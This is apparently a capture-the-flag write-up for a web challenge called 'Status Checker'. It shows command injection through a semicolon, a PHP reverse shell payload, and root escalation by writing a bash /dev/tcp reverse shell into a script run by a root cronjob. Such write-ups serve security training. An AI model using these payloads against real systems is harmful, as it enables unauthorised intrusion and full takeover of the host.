We are given a site where we can check the status of websites.

Entering a valid URL such as ``https://google.com`` will return us the HTTP status code as seen in the following screenshot.

![wimg-1](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/2172799693442df396d9857becae25e70e1ca596/challenges/web/Status%20Checker/images/wimg-1.png)

Entering a semi-colon (;) will break the command. We can try to use the payload ``; whoami``  and we are returned ``www-data`` as our user as seen in the following screenshot.

![wimg-2](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-2.png)

We can attempt to spawn a reverse shell by first having netcat listen on our desired port. In this example, the port will be 45101 and the netcat command will be ``nc -nlvp 45101`` as seen in the following screenshot.

![wimg-3](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-3.png)

Once its listening on the port, we can use the following payload to spawn the reverse shell. Replace "YOUR-IP-HERE" with your IP address.

```
; php -r '$sock=fsockopen("YOUR-IP-ADDRESS",45101);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Input the above payload into the input box as seen in the following screenshot.

![wimg-4](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-4.png)

Click on the "Check HTTP Status" and observe that the website has hung. Return to the netcat session and observe that we have gotten a shell as seen in the following screenshot.

![wimg-5](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-5.png)

We can spawn an interactive shell using the command ``script -qc /bin/bash /dev/null``. Once done, we can explore the system. Navigating to the ``/var/www/`` directory and we can see 2 files.

The files are:
- backup.sh - Owned by the root user.
- my-script.sh - Owned by the www-data user.

![wimg-6](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-6.png)

We can see that the ``backup.sh`` file runs the ``my-script.sh`` file as sudo, effectively running as the root user.

Using the command ``cat /etc/crontab``, we can see that there is a cronjob that runs the ``backup.sh`` file every minute. We can abuse this by changing the contents of the ``my-script.sh`` file.

As we own the ``my-script.sh`` file, we can modify it to spawn a reverse shell using the following commands:

```
echo '#/bin/bash' > my-script.sh
echo 'bash -i >& /dev/tcp/YOUR-IP-HERE/PORT-HERE 0>&1' >> my-script.sh
```

Replace ``YOUR-IP-HERE`` with your IP address and ``PORT-HERE`` with your desired port number. Once done, start another netcat listener on the port that was chosen in the above command. In this example, it will be 45102 as seen in the following screenshot.

![wimg-7](https://github.com/lenebread/GiTxHextech-Challenge-Repo/blob/a0a1f11bace0c0ed057208ff3d3ce65661dfe2af/challenges/web/Status%20Checker/images/wimg-7.png)


